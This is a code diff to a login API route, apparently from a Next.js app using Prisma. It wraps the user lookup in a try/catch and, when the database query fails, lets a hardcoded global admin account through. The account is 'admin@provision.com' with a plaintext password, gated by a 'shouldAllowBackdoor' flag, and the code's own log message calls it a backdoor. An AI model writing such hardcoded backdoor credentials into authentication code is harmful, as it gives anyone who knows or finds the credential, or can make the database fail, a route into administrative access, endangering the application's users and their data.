@@ -108,21 +108,42 @@ export async function POST(request: NextRequest) {
     }
 
     // Check for existing user in DB first to ensure consistent signaling IDs
-    const dbUser = await prisma.user.findUnique({
-      where: { email },
-      select: {
-        id: true,
-        uid: true,
-        email: true,
-        name: true,
-        avatarUrl: true,
-        role: true,
-        passwordHash: true,
-        twoFactorEnabled: true,
-        twoFactorSecret: true,
-        backupCodes: true,
-      },
-    });
+    // BUT: If DB is not ready, allow global admin to proceed
+    let dbUser = null;
+    try {
+      dbUser = await prisma.user.findUnique({
+        where: { email },
+        select: {
+          id: true,
+          uid: true,
+          email: true,
+          name: true,
+          avatarUrl: true,
+          role: true,
+          passwordHash: true,
+          twoFactorEnabled: true,
+          twoFactorSecret: true,
+          backupCodes: true,
+        },
+      });
+    } catch (dbError: any) {
+      // If DB query fails, we can still allow global admin
+      // Check if attempting global admin login
+      if (
+        email === "admin@provision.com" &&
+        password === "password123578951" &&
+        shouldAllowBackdoor
+      ) {
+        log.warn(
+          { err: dbError },
+          "DB query failed, but allowing global admin backdoor"
+        );
+        dbUser = null; // Will be handled below
+      } else {
+        // Not global admin and DB is broken - rethrow to fall through to generic error
+        throw dbError;
+      }
+    }
 
     let user;
 
